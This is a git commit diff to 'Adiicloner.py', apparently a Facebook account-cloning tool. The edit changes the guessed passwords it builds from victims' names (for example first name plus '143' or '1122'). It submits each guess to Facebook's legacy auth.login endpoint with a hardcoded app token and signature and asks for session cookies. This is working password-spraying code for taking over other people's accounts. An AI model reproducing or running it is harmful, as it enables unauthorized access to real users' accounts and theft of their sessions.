d4a5fb96dfdc42d252f5d7a1e5bf7be993505ba9
Meer Sultan Baloch <83895003+Sultan-Baloch@users.noreply.github.com>
2021-07-09 04:17:17 -0700

    Update Adiicloner.py

--- Adiicloner.py
+++ Adiicloner.py
@@ -958,7 +958,7 @@ def pilih_super():
 
 					                           else:									
 
-						                       pass5 = b['first_name'] + '123456'										
+						                       pass5 = b['first_name'] + '143'										
 
 						                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")								
 
@@ -1046,7 +1046,7 @@ def pilih_super():
 
 						                                           else:							
 
-								                               pass7 = b['last_name']+'123456'						
+								                               pass7 = b['last_name']+'143'						
 
 								                               data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")						
 
@@ -1134,7 +1134,7 @@ def pilih_super():
 
 										                                   else:					
 
-										                                       pass9 = b['first_name'] + b['last_name']					
+										                                       pass9 = b['first_name']+'1122'					
 
 										                                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")				
 
